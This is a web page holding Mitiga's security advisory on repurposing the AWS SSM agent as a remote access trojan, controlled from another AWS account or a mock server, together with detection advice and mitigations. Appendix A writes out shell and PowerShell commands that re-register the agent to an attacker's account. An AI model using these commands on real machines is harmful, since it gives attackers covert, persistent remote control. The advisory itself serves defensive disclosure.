<!DOCTYPE html><!-- Last Published: Wed Aug 09 2023 18:32:55 GMT+0000 (Coordinated Universal Time) --><html data-wf-domain="www.mitiga.io" data-wf-page="62058787860ff05ee512e07f" data-wf-site="616f053802514ab652c54cc2" lang="en"><head><meta charset="utf-8"/><title>Mitiga Security Advisory:  Abusing the SSM Agent as a Remote Access Trojan</title><meta content="Mitiga&#x27;s research discovered a significant new post-exploitation security concept: involving the use of Systems Manager (SSM) agent as a Remote Access Trojan (RAT) on Linux and Windows machines, controlling them using another AWS account. We shared our research with the AWS security team and included some of their feedback to this advisory." name="description"/><meta content="Mitiga Security Advisory:  Abusing the SSM Agent as a Remote Access Trojan" property="og:title"/><meta content="Mitiga&#x27;s research discovered a significant new post-exploitation security concept: involving the use of Systems Manager (SSM) agent as a Remote Access Trojan (RAT) on Linux and Windows machines, controlling them using another AWS account. We shared our research with the AWS security team and included some of their feedback to this advisory." property="og:description"/><meta content="https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7e0d4aef7ed28ac2d3fb2_ADVISORY_Shutterstock_2234548621%20_BLACK.jpg" property="og:image"/><meta content="Mitiga Security Advisory:  Abusing the SSM Agent as a Remote Access Trojan" property="twitter:title"/><meta content="Mitiga&#x27;s research discovered a significant new post-exploitation security concept: involving the use of Systems Manager (SSM) agent as a Remote Access Trojan (RAT) on Linux and Windows machines, controlling them using another AWS account. We shared our research with the AWS security team and included some of their feedback to this advisory." property="twitter:description"/><meta content="https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7e0d4aef7ed28ac2d3fb2_ADVISORY_Shutterstock_2234548621%20_BLACK.jpg" property="twitter:image"/><meta property="og:type" content="website"/><meta content="summary_large_image" name="twitter:card"/><meta content="width=device-width, initial-scale=1" name="viewport"/><link href="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/css/mitiga.webflow.1fa54cd82.min.css" rel="stylesheet" type="text/css"/><link href="https://fonts.googleapis.com" rel="preconnect"/><link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous"/><script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script><script type="text/javascript">WebFont.load({  google: {    families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic","Source Sans Pro:200,300,regular,italic,600,700,900"]  }});</script><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script><link href="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/616f0605a126795e9b088672_Mitiga_Fav_32x32.png" rel="shortcut icon" type="image/x-icon"/><link href="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/6262cfc669eb850b61275e6d_Mitiga_logo_purple_Circle_256x256.png" rel="apple-touch-icon"/><link href="rss.xml" rel="alternate" title="RSS Feed" type="application/rss+xml"/><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TFP6DDP');

  gtag('config', 'AW-11210919179');
</script>
<!-- End Google Tag Manager -->

<!-- Google tag (gtag.js) --> 
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-11210919179"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'AW-11210919179'); </script>

<!-- Event snippet for Website traffic conversion page --> 
<script> tag('event', 'conversion', {'send_to': 'AW-11210919179/lDyFCNCvi7kYEIua5OEp'});</script></head><body><div data-collapse="medium" data-animation="default" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar white w-nav"><div data-delay="0" data-hover="false" class="dropdown emergency full-width w-clearfix w-dropdown"><div class="nav-link dropdown-toggle emergency w-dropdown-toggle"><div class="text-block emergecy-contact"><strong>Been breached?</strong> Reach Mitiga&#x27;s experts team of cloud and SaaS incident responders, 365, 24/7</div><div class="small-dropdown-icon emergency-icon w-icon-dropdown-toggle"></div></div><nav class="dropdown-list phonenumber alternate w-dropdown-list"><a href="tel:+18885984654" class="dropdown-link emergencynumber w-dropdown-link"><strong>US </strong>+ 1 888 598 4654</a><div class="div-block-2"></div><a href="tel:+442039741616" class="dropdown-link emergencynumber w-dropdown-link"><strong>UK </strong>+ 44(20) 3974 1616</a><a href="tel:+97239786654" class="dropdown-link emergencynumber w-dropdown-link"><strong>IL </strong>+ 972 3 978 6654</a><a href="tel:+6531383094" class="dropdown-link emergencynumber w-dropdown-link"><strong>SG </strong>+ 65 3138 3094</a><a href="/contact/emergency-contact" class="dropdown-link emergencynumber w-dropdown-link"><strong>EMERGENCY EMAIL</strong></a></nav></div><div data-delay="0" data-hover="false" class="dropdown emergency full-width mobile w-clearfix w-dropdown"><div class="nav-link dropdown-toggle emergency alt6789 w-dropdown-toggle"><div class="text-block emergecy-contact">Reach Mitiga&#x27;s experts 365, 24/7</div><div class="small-dropdown-icon emergency-icon w-icon-dropdown-toggle"></div></div><nav class="dropdown-list phonenumber alternate w-dropdown-list"><a href="tel:+18885984654" class="dropdown-link emergencynumber w-dropdown-link"><strong>US </strong>+ 1 888 598 4654</a><div class="div-block-2"></div><a href="tel:+442039741616" class="dropdown-link emergencynumber w-dropdown-link"><strong>UK </strong>+ 44(20) 3974 1616</a><a href="tel:+97239786654" class="dropdown-link emergencynumber w-dropdown-link"><strong>IL </strong>+ 972 3 978 6654</a><a href="tel:+6531383094" class="dropdown-link emergencynumber w-dropdown-link"><strong>SG </strong>+ 65 3138 3094</a><a href="/contact/emergency-contact" class="dropdown-link emergencynumber w-dropdown-link"><strong>EMERGENCY EMAIL</strong></a></nav></div><div class="container-2 v1-nav-container alternate w-container"><a href="/" class="brand w-nav-brand"><img src="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/6421b5da1f5e55904d6c97aa_Mitiga_logo_tagline.svg" alt="" class="logo-2 alt alt2"/></a><nav role="navigation" class="nav-menu alt alt2 w-clearfix w-nav-menu"><div data-delay="0" data-hover="false" class="dropdown w-dropdown"><div class="nav-link dropdown-toggle w-dropdown-toggle"><div>SOLUTIONS</div><div class="small-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="dropdown-list w-dropdown-list"><a href="/solutions/incident-readiness-resilience-ir2" class="dropdown-link w-dropdown-link">IR2 Cloud Incident Response Platform</a><a href="/solutions/cloud-incident-response" class="dropdown-link w-dropdown-link">Emergency Incident Response</a></nav></div><div data-delay="0" data-hover="false" class="dropdown w-dropdown"><div class="nav-link dropdown-toggle w-dropdown-toggle"><div>Resources</div><div class="small-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="dropdown-list w-dropdown-list"><a href="/mitiga-resources/resources" class="dropdown-link w-dropdown-link">Resource Library</a><a href="/mitiga-resources/mitiga-glossary-of-terms" class="dropdown-link w-dropdown-link">Glossary</a><a href="/blog" class="dropdown-link w-dropdown-link">Blog</a></nav></div><div data-delay="0" data-hover="false" class="dropdown w-dropdown"><div class="nav-link dropdown-toggle w-dropdown-toggle"><div>Company</div><div class="small-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="dropdown-list w-dropdown-list"><a href="/about/team" class="dropdown-link w-dropdown-link">Team</a><a href="/news" class="dropdown-link w-dropdown-link">In the News</a><a href="/about/amazon-web-services" class="dropdown-link w-dropdown-link">AWS Partnership</a><a href="/about/why-choose-mitiga" class="dropdown-link hidden w-dropdown-link">Why Choose Mitiga</a></nav></div><div data-delay="0" data-hover="false" class="dropdown w-dropdown"><div class="nav-link dropdown-toggle w-dropdown-toggle"><div>Working at mitiga</div><div class="small-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="dropdown-list w-dropdown-list"><a href="/careers" class="dropdown-link w-dropdown-link">Working at Mitiga</a><a href="/career/mitiga-current-openings" class="dropdown-link w-dropdown-link">Current Openings</a></nav></div><a href="/contact/contact-us" class="v1-navlink last">REQUEST A DEMO</a><div data-delay="0" data-hover="false" class="dropdown emergency hidden w-clearfix w-dropdown"><div class="nav-link dropdown-toggle emergency w-dropdown-toggle"><div class="text-block emergecy-contact">EMERGENCY contact</div><div class="small-dropdown-icon emergency-icon w-icon-dropdown-toggle"></div></div><nav class="dropdown-list phonenumber w-dropdown-list"><a href="tel:+18885984654" class="dropdown-link emergencynumber w-dropdown-link"><strong>US </strong>+ 1 888 598 4654</a><div class="div-block-2"></div><a href="tel:+442039741616" class="dropdown-link emergencynumber w-dropdown-link"><strong>UK </strong>+ 44(20) 3974 1616</a><a href="tel:+97239786654" class="dropdown-link emergencynumber w-dropdown-link"><strong>IL </strong>+ 972 3 978 6654</a><a href="tel:+6531383094" class="dropdown-link emergencynumber w-dropdown-link"><strong>SG </strong>+ 65 3138 3094</a><a href="/contact/emergency-contact" class="dropdown-link emergencynumber w-dropdown-link"><strong>EMERGENCY EMAIL</strong></a></nav></div></nav><div class="fixed-nav-menu-button w-nav-button"><div class="w-icon-nav-menu"></div></div></div></div><div style="background-image:url(&quot;https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7e0d4aef7ed28ac2d3fb2_ADVISORY_Shutterstock_2234548621%20_BLACK.jpg&quot;)" class="blog-post-header"><div class="blog-post-header-overlay"><div class="container breadcrumb w-container"><div class="breadcrumb-wrapper"><a href="/" class="breadcrumb-link white w-inline-block"><div>Home</div></a><div class="breadcrumb-seperator blog w-embed">»</div><a href="/blog" class="breadcrumb-link white w-inline-block"><div>Blog Main</div></a></div></div><div class="container blog-header w-container"><h2 data-ix="fade-in-on-load" class="subpage-title blog-post-title">Mitiga Security Advisory:  Abusing the SSM Agent as a Remote Access Trojan </h2></div></div></div><div class="section blog-page-section"><div class="container w-container"><div class="blog-post-page-content padding"><div class="text-block-5 by mobile">By</div><div class="single-post-author-block team-social-button"><a href="/author-profiles/ariel-szarf" target="_blank" class="post-author-name mobile">Ariel Szarf</a><div class="post-author-name description w-dyn-bind-empty"></div><a href="/author-profiles/or-aspir" target="_blank" class="post-author-name mobile">Or Aspir</a><a href="#" class="post-author-name mobile w-dyn-bind-empty"></a><a href="#" class="post-author-name mobile w-dyn-bind-empty"></a></div><div class="post-author-line"></div><div class="rich-text-block blog w-richtext"><h2>Overview</h2><p>Mitiga has discovered a new potential post-exploitation technique in AWS (Amazon Web Services): running AWS’s Systems Manager (SSM) agent as a Remote Access Trojan (RAT) on both Linux and Windows machines, controlling the endpoint using another AWS account. We’re sharing this advisory to raise awareness about this new way of abusing the SSM agent that our team developed during our ongoing research in cloud and SaaS (Software as a Service) attacks and forensics.</p><p>The concept is straightforward: the SSM agent, a legitimate tool used by admins to manage their instances, can be re-purposed by an attacker who has achieved high privilege access on an endpoint with SSM agent installed, to carry out malicious activities on an ongoing basis. This allows an attacker who has compromised a machine, hosted on AWS or anywhere else, to maintain access to it and perform various malicious activities. Unlike using common malware types, which are often flagged by antivirus software, using SSM agent in this malicious manner allows the attacker to benefit from the reputation and legitimacy of this binary to cover his tracks.</p><h2>The Benefits Attackers Gain by Using the SSM Agent as a RAT</h2><ol role="list"><li>The SSM agent binary is signed by Amazon, initially considered trusted and approved software by Antivirus (AV) and Endpoint Detection &amp; Response (EDR) solutions. Consequently, the execution of the SSM agent as a RAT may occur without triggering immediate alarms or alerts, evading initial detection.</li><li>Elimination of the need to upload and execute new Remote Access Trojan (RAT) binaries, which may trigger AV and EDR products. The SSM agent is already installed on the endpoint.</li><li>Adversaries can use their own malicious AWS account as a Command and Control (C&amp;C) server, enabling them to control the compromised SSM agent. This allows their communication to appear legitimate, making it harder to detect their activities. </li><li>No code needed for developing the attack infrastructure. You depend solely on the SSM service and agent.</li><li>The SSM agent offers supported features like &quot;RunCommand&quot; or &quot;StartSession,&quot; providing attackers with effortless control over the compromised endpoint from the attacker AWS account. These features allow them to manipulate the endpoint in any desired manner, granting them broad control over its operations.</li><li>The SSM agent binary has gained substantial popularity due to its widespread installation and active use in default Amazon Machine Images (AMIs) within the AWS ecosystem. This prevalence increases the potential attack surface and provides a larger pool of potential targets for adversaries.</li></ol><h2>The Problem—or How Attackers Can Abuse the SSM Agent</h2><p>In our research, we focused on the ability of an SSM agent to run not only on Amazon Elastic Compute Cloud (EC2) instances, but also on non-EC2 machine types (Servers on your own premises and Virtual machines aka VMs, including VMs in other cloud environments). We abused this feature by registering an SSM agent to run in “hybrid” mode even if the agent runs on an EC2 instance.</p><p>Using a couple of simple bash commands, the SSM agent can communicate and execute commands from different AWS accounts than the original AWS account where the EC2 instance is hosted. Through these actions, we also obtained the ability to run more than one SSM agent process in one endpoint, making our rouge agent process to work with our AWS account while the other process to continue working with the original AWS account without any interference.</p><p>Furthermore, by abusing the SSM proxy feature, we managed to make the SSM agent communicate with a non-AWS account endpoint, allowing an attacker to control an SSM agent in a way that does not rely on any AWS infrastructure other that a network path to the substitute endpoint.</p><h2>Exploitation</h2><h3><strong>Scenario 1 – Hijacking the SSM agent</strong>‍</h3><p>In this scenario, the attack is “hijacking” the original SSM agent process by registering the SSM agent to work in “hybrid” mode with a different AWS account, enforcing it to not choose the metadata server for identity consumption (Appendix A). Then, the SSM agent will communicate and execute commands from attacker the owned AWS account.</p><p><strong>Affected Systems </strong></p><p>Linux and Windows machines that have an active SSM agent installed are susceptible to this attack.</p><p><strong>Access Level</strong></p><p>The threat actor must be able to run as root on the targeted Linux machine, or as administrator on the targeted Windows system.</p><p><strong>Benefits</strong></p><ol role="list"><li><strong>Hard to detect locally </strong>– After hijacking the SSM agent, it is very difficult for any software running on the host (such as antivirus software) to detect that the SSM agent is doing something malicious in the endpoint. As it continues to run as a legitimate SSM agent.</li><li><strong>The SSM agent runs as root</strong> – In this scenario the SSM agent runs as root which gives the attacker unrestricted access to all system resources.<strong>‍</strong></li><li><strong>Persistence</strong> – The SSM agent is configured through the file system to run in hybrid mode in a persistent manner, meaning it will connect to the malicious C&amp;C even after a reboot of the host.</li></ol><p><strong>Drawbacks</strong></p><ol role="list"><li><strong>Potentially suspicious on the AWS side-</strong> After the SSM agent gets hijacked, the agent is no longer reporting back to the System Manager service as active and reachable on the victim’s AWS account. which should raise suspicion.<strong>‍</strong></li><li><strong>High privileges required -</strong> To register the SSM agent successfully, the attacker would need to run with root privileges, which is not easily attainable through exploit abuse.</li></ol><h3><strong>Scenario 2 – Running Another SSM Agent Process</strong></h3><p>In this scenario, the threat actor runs another SSM agent process, which normally will not run if it finds another SSM agent process already running. The malicious agent process communicates with the attacker’s AWS account, leaving the original SSM agent to continue communicating with the original AWS account.</p><p>This is achievable in Linux platform using Linux namespaces (Appendix B). The malicious SSM agent process allows the attacker to use the “Run Command” feature. Another case is to run the agent in “container” mode which allows the attacker to use the “Start Session” feature via AWS CLI (Appendix C).</p><p>On Windows platforms, we run another SSM agent process by setting environment variables for the malicious agent process (Appendix D), allowing the attacker to use the “Run Command” feature.</p><p><strong>Affected Systems</strong></p><p>Linux and Windows machines that have an active SSM agent installed are susceptible to this post exploitation persistence mechanism.</p><p><strong>Access Level</strong></p><p>At least one of the following permissions is crucial for a successful attack:</p><p>The threat actor must be able run as at least non-root privileged user on the targeted Linux machine, or as administrator on the targeted Windows system. One way to achieve this is by using System Manager itself in the case where the attacker has privileges within the victim AWS to use the SSM service to interact with the EC2 instances.</p><p><strong>Benefits</strong></p><ol role="list"><li><strong>Less Permissions needed -</strong> No need for root permissions to run another agent process (in second implementation for Linux server).<strong>‍</strong></li><li><strong>Without impact in the victim AWS account -</strong> There is no impact on the original agent.</li></ol><p><strong>Drawbacks</strong></p><ol role="list"><li><strong>Easier to detect on the endpoint -</strong> The malicious agent runs in a separate process tree, making it easier to distinguish its execution from that of the original agent process.<strong>‍</strong></li><li><strong>Agent persistence -</strong> The responsibility of ensuring agent persistence lies solely with the attacker.</li></ol><h3>Using Mock Server Instead of AWS Account to Manage the SSM Agent</h3><p>‍<br/>For several reasons, threat actor may prefer not using AWS account to manage the agents. They may prefer to generate network traffic to their chosen IP rather than AWS visibility on their C&amp;C because concrete risk management for any campaign. </p><p>During our research, we noticed that an SSM feature that can be abused in order to route the SSM traffic to an attacker-controlled server, allowing the usage of the legitimate binary without the traffic ever going through AWS’s servers. This feature is using proxy to the server by changing the environment variables – ‘http_proxy’ and ‘https_proxy’.</p><p>Based on this finding, research was published in January 2021 (<a href="https://frichetten.com/blog/ssm-agent-tomfoolery/" target="_blank">https://frichetten.com/blog/ssm-agent-tomfoolery/</a>) and the public source code of the agent (<a href="https://github.com/aws/amazon-ssm-agent" target="_blank">https://github.com/aws/amazon-ssm-agent</a>), we wrote a simple mock server for “Run Command” feature.</p><h2>Detection</h2><p>In the first scenario, the hijack technique, you can monitor the instance data changing. When an agent is registered, it gets a new instance ID. </p><p>The details are in a new directory, in Linux in <strong><em>“/var/lib/amazon/ssm/i-*****************”</em></strong>, and in windows in <strong><em>“C:\ProgramData\Amazon\SSM\InstanceData\i-*****************”</em></strong>. After the hijack, if you see more than one directory with a different instance name than the original instance ID, it is suspicious. Also, monitoring bash/cmd commands or CreateProcess for running “amazon-ssm-agent&quot; binary with the flags: “register”, “code”, “id”, and “region”. You can detect the “hijack” execution. Moreover, in the AWS account you can see the connection to this agent is lost. </p><p>For the second scenario, you can detect if there is more than one process: “amazon-ssm-agent&quot;. You should have just one instance at the same time. If there are two or more, it&#x27;s also suspect.</p><p>For both attack scenarios, if the attack is performed from the AWS account (by start session, run command, or any other technique to run code on EC2 from the AWS account) you should see suspicious actions that related to Sessions Manager in CloudTrail logs.</p><h2>Recommendations</h2><p>1. If the SSM agent was added to the allow list in your AV or EDR solutions, it is strongly recommended to reconsider this decision. Given the potential compromise of the SSM agent as discussed, relying solely on the allow list is no longer reliable. Therefore, it is advisable to remove the SSM binaries from the allow list. By doing so, you enable your EDR solution to thoroughly examine and analyze the behavior of these processes, actively searching for any indications of malicious activity or suspicious anomality.</p><p>2. To effectively detect and respond to this malicious action, we recommend following the detection techniques mentioned earlier and integrating them into your SIEM (Security Information and Event Management) and SOAR (Security Orchestration, Automation, and Response) platforms. By implementing these detections, you enhance your capabilities to proactively hunt for and identify instances of this threat.</p><p>3. AWS security team offered a solution to restrict the receipt of commands from the original AWS account/organization using the VPC (Virtual Private Cloud) endpoint for Systems Manager (https://docs.aws.amazon.com/systems-manager/latest/userguide/setup-create-vpc.html). If your EC2 instances are in a private subnet without access to the public network via a public EIP address or NAT gateway, you can still configure the System Manager service through a VPC endpoint. By doing so, you can ensure that the EC2 instances only respond to commands originating from principals within their original AWS account or organization. To implement this restriction effectively, refer to the VPC Endpoint policy documentation (<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html" target="_blank">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html</a>).</p><h2>Summary<br/></h2><p>Mitiga&#x27;s research discovered a significant new post-exploitation security concept: involving the use of Systems Manager (SSM) agent as a Remote Access Trojan (RAT) on Linux and Windows machines, controlling them using another AWS account. We shared our research with the AWS security team and included some of their feedback to this advisory. This advisory was created to raise awareness about the threat and its potential impact on endpoint security. the benefits of using SSM agent as a RAT, such as leveraging existing binaries, utilizing a malicious AWS account for C&amp;C, and exploiting the agent&#x27;s features, present serious risks to endpoint security. The widespread popularity and initial trust associated with the SSM agent further amplify the need for organizations to take immediate action to mitigate this new technique. <br/><br/><strong>By understanding the risks and implementing proper security measures, businesses can fortify their defenses and protect their systems from this evolving threat.</strong></p><h2>References</h2><ul role="list"><li>AWS Systems Manager documentation: <a href="https://aws.amazon.com/systems-manager/" target="_blank">https://aws.amazon.com/systems-manager/</a></li><li>SSM Agent documentation: <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/ssm-agent.html" target="_blank">https://docs.aws.amazon.com/systems-manager/latest/userguide/ssm-agent.html</a></li><li>Supported operating systems and machine types: <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/operating-systems-and-machine-types.html" target="_blank">https://docs.aws.amazon.com/systems-manager/latest/userguide/operating-systems-and-machine-types.html</a></li><li>AMI with preinstalled SSM agent: <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/ami-preinstalled-agent.html" target="_blank">https://docs.aws.amazon.com/systems-manager/latest/userguide/ami-preinstalled-agent.html</a>‍</li><li>Install SSM agent for a hybrid mode: <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-managedinstances.html" target="_blank">https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-managedinstances.html</a></li></ul><h2>Appendix A – Hijacking the original SSM agent</h2><p><strong>In Linux (shell command):</strong></p><p>sudo systemctl stop amazon-ssm-agent &amp;&amp; echo &quot;yes&quot; | sudo amazon-ssm-agent -register -code &lt;ACTIVATION_CODE&gt; -id &lt;ACTIVATION_ID&gt; -region &lt;REGION&gt; &amp;&amp; sudo systemctl start amazon-ssm-agent</p><p><strong>In windows (cmd command):</strong></p><p>&#x27;yes&#x27; | &amp; &#x27;C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe&#x27; -register -code &lt;ACTIVATION_CODE&gt; -id &lt;ACTIVATION_ID&gt; -region &lt;REGION&gt;; Restart-Service AmazonSSMAgent</p><h2>Appendix B – Linux Server root agent that enables “Run Command”</h2><figure class="w-richtext-figure-type-image w-richtext-align-normal" class="w-richtext-align-normal w-richtext-figure-type-image"><div><img src="https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7e8c2a2b0471f695f5891_bBQoJN6Z2s6eqq6GhJ4PvkPnQz0OyXNask9y5n8ZZBHHniv3kmRaUdzYevxHI0fGuv_G7fgjkvhms3MqZ5RFiuQZtb1-bMQN0d_K2JUtyg7n2J94Eq_dPp1t243XdGaEMLYs4fTgVckVaJjBq7x3n89Dm4vx1eY.png" alt=""/></div></figure><h2>Appendix C – Linux Server non-root agent that enables “Start Session”</h2><figure class="w-richtext-figure-type-image w-richtext-align-normal" class="w-richtext-align-normal w-richtext-figure-type-image"><div><img src="https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7f1334307ed70d24850ec_6Qbmg4CuRF6LjODlqi86JRXnGu_Fkq3cWsKu7mZijJC_c_-G1STdjRCCmKi02LaPYZp2-Qob41aTPu6XLbLCPzXA3IPFLAC0O57pJ6QT8UGzGiY5dUV-6i-zn3STT3pUvszO-EdWnQ0PY_qFOkZik2QTaDfE3Xg.png" alt=""/></div></figure><h2>Appendix D – Windows Server agent that enables “Run Command”</h2><p>In CMD Window (after successful RDP):</p><figure class="w-richtext-figure-type-image w-richtext-align-normal" class="w-richtext-align-normal w-richtext-figure-type-image"><div><img src="https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7e92cba3beb56a7740eb5_4lvC8jTJemAHh7zDSfjEwfznzMAlAmz5FFjX4DYClijpdAl45q1era9kCBhKLIrDkXof3cKfAeamvoYaEd9XY4Mbl9K9JB9pubPu51aEF5UFZA7Ecigll0zD8tceSLb1EVY9WD2KiMvfw3fJop5ZbeOg1gQLXbI.png" alt=""/></div></figure><p>‍</p></div><div class="w-layout-blockcontainer blog-c w-container"><a href="#" class="v1-primary-btn blog-button btn-go-mitiga w-dyn-bind-empty w-button"></a></div><div class="blog-ref w-dyn-bind-empty"></div><div class="div-block-28"><div class="blog-single-post-date">Last updated: </div><div data-ix="fade-in-on-load-2" class="blog-single-post-date">August 1, 2023</div></div></div><div class="section-title-wrapper"></div><div class="section-title-wrapper"><h2 class="section-title dont-miss mobile">Don&#x27;t miss these stories:</h2></div><div class="blog-posts-list-wrapper w-dyn-list"><div role="list" class="blog-posts-list related mobile w-clearfix w-dyn-items w-row"><div role="listitem" class="simple-blog-post-item related w-dyn-item w-col w-col-4"><a href="/blog/abusing-the-amazon-web-services-ssm-agent-as-a-remote-access-trojan" style="background-image:url(&quot;https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7e325f26a93ab1e8e277e_BLOG_Shutterstock_2234548621%20_1_.jpg&quot;)" class="simple-blog-image-block w-inline-block"><div style="background-image:url(&quot;https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64c7e325f26a93ab1e8e277e_BLOG_Shutterstock_2234548621%20_1_.jpg&quot;)" class="blog-post-overlay light"></div></a><div class="blog-post-content"><a href="/blog/abusing-the-amazon-web-services-ssm-agent-as-a-remote-access-trojan" class="blog-post-title-link">More on Abusing the Amazon Web Services SSM Agent as a Remote Access Trojan</a><p class="blog-post-summary blog-summary">Imagine that you’re a SOC (Security Operations Center) analyst receiving an alert about suspicious behavior from a binary on an EC2 instance. After checking the binary on VirusTotal, you find it was an AWS-developed software signed by Amazon. Further investigation reveals that it communicated only with Amazon-owned IP addresses.</p></div></div><div role="listitem" class="simple-blog-post-item related w-dyn-item w-col w-col-4"><a href="/blog/why-the-gartner-cira-announcement-is-so-important-for-incident-response" style="background-image:url(&quot;https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64b87f352fd64bfc7cc302ba_AboveClouds_Why_CIRA_1.jpg&quot;)" class="simple-blog-image-block w-inline-block"><div style="background-image:url(&quot;https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/64b87f352fd64bfc7cc302ba_AboveClouds_Why_CIRA_1.jpg&quot;)" class="blog-post-overlay light"></div></a><div class="blog-post-content"><a href="/blog/why-the-gartner-cira-announcement-is-so-important-for-incident-response" class="blog-post-title-link">Why the Implementation of CIRA is so Important for Incident Response</a><p class="blog-post-summary blog-summary">Incident response for cloud and SaaS (Software as a Service) requires new capabilities. Gartner® has released its recent report entitled “Emerging Tech: Security — Cloud Investigation and Response Automation Offers Transformation Opportunities.”</p></div></div><div role="listitem" class="simple-blog-post-item related w-dyn-item w-col w-col-4"><a href="/blog/mitiga-security-advisory-lack-of-forensic-visibility-with-the-basic-license-in-google-drive" style="background-image:url(&quot;https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/646562ebe9e0cd721928d753_Shutterstock_1223599702.1.jpg&quot;)" class="simple-blog-image-block w-inline-block"><div style="background-image:url(&quot;https://uploads-ssl.webflow.com/616f053802514a246ec54cfc/646562ebe9e0cd721928d753_Shutterstock_1223599702.1.jpg&quot;)" class="blog-post-overlay light"></div></a><div class="blog-post-content"><a href="/blog/mitiga-security-advisory-lack-of-forensic-visibility-with-the-basic-license-in-google-drive" class="blog-post-title-link">Mitiga Security Advisory:  Lack of Forensic Visibility  with the Basic License in Google Drive</a><p class="blog-post-summary blog-summary">After gaining initial access to any platform, data theft (exfiltration) is one of the most common attack vectors used by threat actors.</p></div></div></div></div></div></div><div class="section purple-cta-section ir2 black"><div class="container-6 w-container"><div class="text-block-11">Want to see the future of IR for cloud and SaaS? <a href="/contact/contact-us" class="link-13">Request a demo of IR2</a></div><div class="w-embed w-script"><script src="//go.mitiga.io/js/forms2/js/forms2.min.js"></script> <form id="mktoForm_1008"></form> <script>MktoForms2.1oadForm("//go.mitiga.io", "422-DJP-161", 1008);</script></div></div></div><div class="simple-footer"><div class="container footer w-container"><div class="footer-row w-row"><div class="footer-logo-column-left w-col w-col-3"><img src="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/616f053802514a55fdc54e20_Mitiga_logo_light_purp.png" loading="lazy" alt="" class="image-2"/></div><div class="footer-menu-column w-col w-col-7"><a href="/solutions/incident-readiness-resilience-ir2-bak" class="footer-inline-link">SOLUTIONS</a><a href="/blog" class="footer-inline-link">BLOG</a><a href="/about/team" class="footer-inline-link">ABOUT</a><a href="https://www.comeet.com/jobs/mitiga/26.00B" class="footer-inline-link">working at mitiga</a><a href="/contact/contact-us" class="footer-inline-link">CONTACT</a></div><div class="footer-social-col-right w-col w-col-2"><a href="https://twitter.com/Mitiga_io" target="_blank" class="footer-social-icon w-inline-block"><img src="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/616f053802514a2d6dc54d14_Icon-twitter.png" alt="Twitter" class="footer-small-social-icon"/></a><a href="https://www.linkedin.com/company/mitiga-io/" target="_blank" class="footer-social-icon w-inline-block"><img src="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/616f053802514a630ac54e13_linkedin_icon_200x200_white.png" alt="LinkedIn" class="footer-small-social-icon"/></a></div></div></div><div class="container-11 w-container"><div class="light-footer-link purple">Copyright ©️ Mitiga Security Inc. All rights reserved | <a href="https://www.mitiga.io/terms-of-use" target="_blank" class="link-9"><span>Terms of Use</span></a> | <a href="https://www.mitiga.io/privacy-policy" target="_blank"><span class="text-span-22">Privacy Policy</span></a></div></div></div><script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=616f053802514ab652c54cc2" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script><script src="https://uploads-ssl.webflow.com/616f053802514ab652c54cc2/js/webflow.b0194bd81.js" type="text/javascript"></script><!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TFP6DDP"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<!-- Capture UTM parameters and pass to marketo forms --> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.0/js.cookie.min.js"></script>
<script>
    const my_utmParameters = [
        "utm_source",
        "utm_medium",
        "utm_campaign"
    ];
    
